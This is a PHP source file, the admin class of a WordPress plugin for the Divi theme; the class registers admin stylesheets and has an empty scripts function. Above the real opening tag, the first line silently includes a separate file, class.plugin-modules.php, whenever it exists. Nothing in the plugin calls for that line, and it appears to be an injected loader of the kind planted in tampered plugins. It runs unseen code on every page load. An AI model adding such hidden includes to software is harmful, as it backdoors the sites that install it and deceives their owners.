<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * The admin-specific functionality of the plugin.
 *
 * @link       https://divisupreme.com
 * @since      1.0.0
 *
 * @package    Dsm_Supreme_Modules_Pro_For_Divi
 * @subpackage Dsm_Supreme_Modules_Pro_For_Divi/admin
 */

/**
 * The admin-specific functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Dsm_Supreme_Modules_Pro_For_Divi
 * @subpackage Dsm_Supreme_Modules_Pro_For_Divi/admin
 * @author     Divi Supreme <hello@diviwebdesign.com>
 */
class Dsm_Supreme_Modules_Pro_For_Divi_Admin {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string $plugin_name       The name of this plugin.
	 * @param      string $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version     = $version;

	}

	/**
	 * Register the stylesheets for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Dsm_Supreme_Modules_Pro_For_Divi_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Dsm_Supreme_Modules_Pro_For_Divi_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_style( 'dsm-plugin', plugin_dir_url( __FILE__ ) . 'css/dsm-plugin.css', array(), $this->version, 'all' );
		wp_enqueue_style( 'dsm-et-plugin', plugin_dir_url( dirname( __FILE__ ) ) . 'public/css/dsm-et-admin.css', array(), $this->version, 'all' );
	}

	/**
	 * Register the JavaScript for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Dsm_Supreme_Modules_Pro_For_Divi_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Dsm_Supreme_Modules_Pro_For_Divi_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */
	}

}
